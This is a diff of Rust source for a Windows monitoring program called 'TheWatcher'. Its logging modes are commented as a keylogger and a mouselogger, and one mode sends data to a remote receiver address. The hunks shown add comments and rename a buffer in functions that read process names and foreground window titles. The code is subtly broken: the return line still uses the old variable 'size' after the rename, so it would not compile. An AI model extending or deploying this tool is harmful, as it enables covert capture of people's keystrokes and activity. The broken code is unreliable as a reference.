@@ -15,8 +15,11 @@ use windows::{
 pub enum LoggingOptions {
     // <Windows tail title>: receiver IP / DNS address
     NETWORK_ACTIVITY_MODE,
+    // keylogger
     KEYBOARD_ONLY,
+    // mouselogger
     MOUSE_ONLY,
+    // All with multi-threading
     ALL,
 }
 
@@ -27,8 +30,8 @@ pub struct TheWatcher {
     csv_option: bool,
     option: LoggingOptions,
     target: String,
-    // data_bus_stream: Someting,
     buffered_data: BufferedData,
+    // data_bus_stream: Someting,
 }
 
 struct BufferedData {
@@ -70,10 +73,11 @@ impl TheWatcher {
             option,
             buffered_data,
             target,
-        } // data_bus_stream
+            // data_bus_stream,
+        } 
     }
 
-    // fn get_name_process - unit test done
+    // unit test done - fn get_name_process
     unsafe fn get_name_process(pid: u32)-> windows::core::Result<String>{ 
         let handle= OpenProcess(
             PROCESS_QUERY_LIMITED_INFORMATION,
@@ -82,14 +86,15 @@ impl TheWatcher {
         )?;
 
         // dead code: let title_len= windows::Wind32::UI::WindowsAndMessaging::GetWindowTextLengthW(hwnd)
-        let mut buffer= [0u16; 1024];
-        let mut size= buffer.len() as u32;
+        const BUFFER_MAX_SIZE: usize= 2028;
+        let mut buffer= [0u16; BUFFER_MAX_SIZE];
+        let mut buffer_size= buffer.len() as u32;
 
         QueryFullProcessImageNameW(
             handle,
             Threading::PROCESS_NAME_WIN32,
             PWSTR(buffer.as_mut_ptr()),
-            &mut size
+            &mut buffer_size
         )?;
 
         Ok(String::from_utf16_lossy(&buffer[..size as usize]))
@@ -164,7 +169,9 @@ impl TheWatcher {
         filtered_string
     }
 
-    unsafe fn get_current_windows_title_name()-> String{ // unit test done
+    // title name supporte English, Japanese, and so on (unicode)
+    // unit test done - fn get_current_windows_title_name()
+    unsafe fn get_current_windows_title_name()-> String{ 
         let mut reulst_title_string= String::new();
         
         unsafe{
